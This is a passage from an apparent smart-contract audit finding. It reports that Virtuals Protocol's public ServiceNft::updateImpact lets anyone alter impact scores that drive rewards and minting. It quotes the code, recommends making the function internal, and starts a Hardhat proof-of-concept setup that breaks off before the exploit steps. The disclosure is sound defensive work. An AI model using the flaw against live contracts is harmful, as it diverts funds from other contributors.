<pre data-index="6" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">Contribution Process: Contributors submit their proposals through our frontend, utilizing the modular consensus framework. Each proposal generates a contribution NFT regardless of acceptance, authenticating the submission's origin.</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">State Finality in ICV: Accepted contributions are minted as service NFTs on-chain and assigned to the appropriate Virtual address within the ICV, validating their integration into the Virtual ecosystem.</span></span></code></pre>
<p>This function calls the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90"><code>ServiceNft::updateImpact</code></a> which sets up the impacts using the <code>datasetImpactWeight</code> variable:</p>
<pre data-index="7" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">updateImpact</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">datasetId</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">datasetId</span><span class="mtk1">] = (</span><span class="mtk12">rawImpact</span><span class="mtk1"> * </span><span class="mtk12">datasetImpactWeight</span><span class="mtk1">) / </span><span class="mtk7">10000</span><span class="mtk1">;            &lt;&lt;@ -- </span><span class="mtk3">// datasetImpactWeight is used</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">] = </span><span class="mtk12">rawImpact</span><span class="mtk1"> - </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">datasetId</span><span class="mtk1">];                     &lt;&lt;@ -- </span><span class="mtk3">// Affects both `proposalId` and `datasetId`</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">SetServiceScore</span><span class="mtk1">(</span><span class="mtk12">datasetId</span><span class="mtk1">, </span><span class="mtk12">_maturities</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">], </span><span class="mtk12">_impacts</span><span class="mtk1">[</span><span class="mtk12">datasetId</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_maturities</span><span class="mtk1">[</span><span class="mtk12">datasetId</span><span class="mtk1">] = </span><span class="mtk12">_maturities</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>However, as we can see the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90"><code>ServiceNft::updateImpact</code></a>’s visibility modifier is public, allowing anyone to call it with any <code>virtualId</code>/<code>proposalId</code>. So if the admin decides to call the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L141"><code>ServiceNft::setDatasetImpactWeight</code></a>, there would be a cascading issue where users would simply update the impact accordingly to their own favour.</p>
<p>There are financial incentives observed as well, described as follows:</p>
<ol>
<li>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L252"><code>AgentRewardV2::_distributeContributorRewards</code></a> uses <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120"><code>ServiceNft::getImpact</code></a> call for calculating rewards; hence, allowing to gain higher rewards or provide lesser rewards to the rest.</li>
</ol>
<pre data-index="8" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_distributeContributorRewards</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        RewardSettingsCheckpoints.RewardSettings </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">settings</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) </span><span class="mtk11">private</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">for</span><span class="mtk1"> (</span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">i</span><span class="mtk1"> = </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1"> &lt; </span><span class="mtk12">services</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1">; </span><span class="mtk12">i</span><span class="mtk1">++) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">serviceId</span><span class="mtk1"> = </span><span class="mtk12">services</span><span class="mtk1">[</span><span class="mtk12">i</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">impact</span><span class="mtk1"> = </span><span class="mtk12">serviceNftContract</span><span class="mtk1">.</span><span class="mtk11">getImpact</span><span class="mtk1">(</span><span class="mtk12">serviceId</span><span class="mtk1">);           &lt;&lt;@ -- </span><span class="mtk3">// Uses getImpact</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">impact</span><span class="mtk1"> == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk15">continue</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ServiceReward</span><span class="mtk1"> </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">serviceReward</span><span class="mtk1"> = </span><span class="mtk12">_serviceRewards</span><span class="mtk1">[</span><span class="mtk12">serviceId</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">serviceReward</span><span class="mtk1">.</span><span class="mtk12">impact</span><span class="mtk1"> == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">serviceReward</span><span class="mtk1">.</span><span class="mtk12">impact</span><span class="mtk1"> = </span><span class="mtk12">impact</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_rewardImpacts</span><span class="mtk1">[</span><span class="mtk12">reward</span><span class="mtk1">.</span><span class="mtk12">id</span><span class="mtk1">][</span><span class="mtk12">serviceNftContract</span><span class="mtk1">.</span><span class="mtk11">getCore</span><span class="mtk1">(</span><span class="mtk12">serviceId</span><span class="mtk1">)] += </span><span class="mtk12">impact</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . . </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<ol start="2">
<li>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/token/Minter.sol#L134"><code>Minter::mint</code></a> uses the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120"><code>ServiceNft::getImpact</code></a> call to transfer tokens; hence, leading to excess or lower funds being transferred.</li>
</ol>
<pre data-index="9" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">nftId</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">noReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">finalImpactMultiplier</span><span class="mtk1"> = </span><span class="mtk11">_getImpactMultiplier</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">datasetId</span><span class="mtk1"> = </span><span class="mtk12">contribution</span><span class="mtk1">.</span><span class="mtk11">getDatasetId</span><span class="mtk1">(</span><span class="mtk12">nftId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">impact</span><span class="mtk1"> = </span><span class="mtk11">IServiceNft</span><span class="mtk1">(</span><span class="mtk12">serviceNft</span><span class="mtk1">).</span><span class="mtk11">getImpact</span><span class="mtk1">(</span><span class="mtk12">nftId</span><span class="mtk1">);          &lt;&lt;@ -- </span><span class="mtk3">// Uses getImpact</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">impact</span><span class="mtk1"> &gt; </span><span class="mtk12">maxImpact</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">impact</span><span class="mtk1"> = </span><span class="mtk12">maxImpact</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1"> = (</span><span class="mtk12">impact</span><span class="mtk1"> * </span><span class="mtk12">finalImpactMultiplier</span><span class="mtk1"> * </span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk7">18</span><span class="mtk1">) / </span><span class="mtk12">DENOM</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">dataAmount</span><span class="mtk1"> = </span><span class="mtk12">datasetId</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ? (</span><span class="mtk11">IServiceNft</span><span class="mtk1">(</span><span class="mtk12">serviceNft</span><span class="mtk1">).</span><span class="mtk11">getImpact</span><span class="mtk1">(</span><span class="mtk12">datasetId</span><span class="mtk1">) * </span><span class="mtk12">finalImpactMultiplier</span><span class="mtk1"> * </span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk7">18</span><span class="mtk1">) / </span><span class="mtk12">DENOM</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            : </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<h3 style="position:relative;" id="impact"><a class="anchor before" aria-label="impact permalink" href="#impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<ol>
<li>Public <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90"><code>ServiceNft::updateImpact</code></a> function allows changing impacts to anyone.</li>
<li>
<p>Cascading issue leads loss of funds via:</p>
<ul>
<li>Higher / Lower rewards according to the <code>datasetImpactWeight</code> increase or decrease.</li>
<li>Higher / Lower mints as per the <code>datasetImpactWeight</code> change.</li>
</ul>
</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-2"><a class="anchor before" aria-label="recommended mitigation steps 2 permalink" href="#recommended-mitigation-steps-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>It is highly contextual as per what the protocol intends to do, it is suggested to not keep <code>updateImpact</code> as a public function as it would be unfair for other users:</p>
<pre data-index="10" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">-    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">updateImpact</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">+    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">updateImpact</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-1"><a class="anchor before" aria-label="proof of concept 1 permalink" href="#proof-of-concept-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>The test case below was ran using a base mainnet fork, please add the same to the <code>hardhat.config.js</code> file.</p>
<p>The hardhat version wasn’t supporting the base mainnet fork, so it had to be upgraded:</p>
<pre data-index="11" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    "hardhat": "^2.23.0",</span></span></code></pre>
<p>Add the following values to the <code>.env</code> file (along with private keys:</p>
<pre data-index="12" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">### Genesis DAO settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_VOTING_DELAY=0</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_VOTING_PERIOD=900</span></span>
<span class="grvsc-line"><span class="grvsc-source">GENESIS_PROPOSAL_THRESHOLD=0</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Virtual DAO settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_VOTING_DELAY=0</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_VOTING_PERIOD=900</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_PROPOSAL_THRESHOLD=1000000000000000000000000</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_QUORUM_NUMERATOR=1000</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Other settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">CHAIN_ID=84532</span></span>
<span class="grvsc-line"><span class="grvsc-source">VIRTUAL_APPLICATION_THRESHOLD=50000000000000000000 # 50</span></span>
<span class="grvsc-line"><span class="grvsc-source">VIRTUAL_APPLICATION_THRESHOLD_VIP=125000000000000000000 #125 $V</span></span>
<span class="grvsc-line"><span class="grvsc-source">MATURITY_DURATION=1000 # number of blocks until initial virtual staker can withdraw (1000 blocks = ~33 minutes)</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### AgentToken settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_SUPPLY=1000000000 # 1B supply</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT_TRX=100000 # 100k max token per txn</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT_WALLET=1000000 # 1M token per wallet</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LP_SUPPLY=1000000000 # 1B LP tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_LIMIT=1000000000</span></span>
<span class="grvsc-line"><span class="grvsc-source">AGENT_TOKEN_VAULT_SUPPLY=0 #</span></span>
<span class="grvsc-line"><span class="grvsc-source">BOT_PROTECTION=3600 # 1hr</span></span>
<span class="grvsc-line"><span class="grvsc-source">TAX=100 # 3%</span></span>
<span class="grvsc-line"><span class="grvsc-source">BONDING_TAX=1</span></span>
<span class="grvsc-line"><span class="grvsc-source">SWAP_THRESHOLD=1 # 0.00001% of total supply</span></span>
<span class="grvsc-line"><span class="grvsc-source">### VOTING_TOKEN=</span></span>
<span class="grvsc-line"><span class="grvsc-source">TBA_REGISTRY=</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### Reward settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">PARENT_SHARES=2000 # 20%</span></span>
<span class="grvsc-line"><span class="grvsc-source">PROTOCOL_SHARES=1000 # 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">CONTRIBUTOR_SHARES=5000 # 50%</span></span>
<span class="grvsc-line"><span class="grvsc-source">STAKER_SHARES=9000 # 90%</span></span>
<span class="grvsc-line"><span class="grvsc-source">REWARD_STAKE_THRESHOLD=2000000000000000000 # 2 eth</span></span>
<span class="grvsc-line"><span class="grvsc-source">DATASET_SHARES=7000 # 70%</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">### TAX MANAGER</span></span>
<span class="grvsc-line"><span class="grvsc-source">MIN_SWAP_THRESHOLD=100000000000000000 # 0.1</span></span>
<span class="grvsc-line"><span class="grvsc-source">MAX_SWAP_THRESHOLD=1000000000000000000000 # 1000</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">UNISWAP_ROUTER=0x4752ba5dbc23f44d87826276bf6fd6b1c372ad24</span></span></code></pre>
<p>Create a file called <code>PoC.js</code> anad add the following test case inside the <code>/tests</code> folder and run <code>npx hardhat test --grep "Unfair updateImpact"</code>:</p>
<details>
<pre data-index="13" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">const { parseEther, toBeHex, formatEther } = require("ethers/utils");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const { expect } = require("chai");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const {</span></span>
<span class="grvsc-line"><span class="grvsc-source">  loadFixture,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  mine,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  impersonateAccount,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  setBalance,</span></span>
<span class="grvsc-line"><span class="grvsc-source">} = require("@nomicfoundation/hardhat-toolbox/network-helpers");</span></span>
<span class="grvsc-line"><span class="grvsc-source">const { ethers } = require("hardhat");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">describe("AgentFactory", () =&gt; {</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const PROPOSAL_THRESHOLD = parseEther("50000"); // 50k</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const MATURITY_SCORE = toBeHex(2000, 32); // 20%</span></span>
<span class="grvsc-line"><span class="grvsc-source">  const IP_SHARE = 1000; // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  const genesisInput = {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    name: "Jessica",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    symbol: "JSC",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tokenURI: "http://jessica",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoName: "Jessica DAO",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    cores: [0, 1, 2],</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tbaSalt:</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "0xa7647ac9429fdce477ebd9a95510385b756c757c26149e740abbab0ad1be2f16",</span></span>
<span class="grvsc-line"><span class="grvsc-source">    tbaImplementation: process.env.TBA_IMPLEMENTATION || ethers.ZeroAddress,</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoVotingPeriod: 600,</span></span>
<span class="grvsc-line"><span class="grvsc-source">    daoThreshold: 1000000000000000000000n,</span></span>
<span class="grvsc-line"><span class="grvsc-source">  };</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  const getAccounts = async () =&gt; {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Fund all accounts with ETH for gas (10 ETH each)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];</span></span>
<span class="grvsc-line"><span class="grvsc-source">    for (const account of fundAccounts) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await setBalance(account.address, parseEther("10"));</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  };</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">  async function deployBaseContracts() {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const { deployer, ipVault, treasury } = await getAccounts();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Setting up environment variables if not present in the actual .env</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // This is for testing purposes only</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = "1000"; // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = "0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9"; // Base mainnet Uniswap router</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther("10000000").toString(); // 10M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther("5000000").toString(); // 5M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther("2000000").toString(); // 2M</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = "100"; // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.TAX) process.env.TAX = "500"; // 5%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther("10").toString(); // 10 tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying VirtualToken...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const virtualToken = await ethers.deployContract(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      "VirtualToken",</span></span>
<span class="grvsc-line"><span class="grvsc-source">      [PROPOSAL_THRESHOLD, deployer.address],</span></span>
<span class="grvsc-line"><span class="grvsc-source">      {}</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    await virtualToken.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log(`VirtualToken deployed at ${virtualToken.target}`);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying ERC6551Registry Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tbaRegistry = await ethers.deployContract("ERC6551Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await tbaRegistry.waitForDeployment();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deployed ERC6551Registry Registry");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    console.log("Deploying AgentNftV2...");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const AgentNft = await ethers.getContractFactory("AgentNftV2");</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);</span></span>
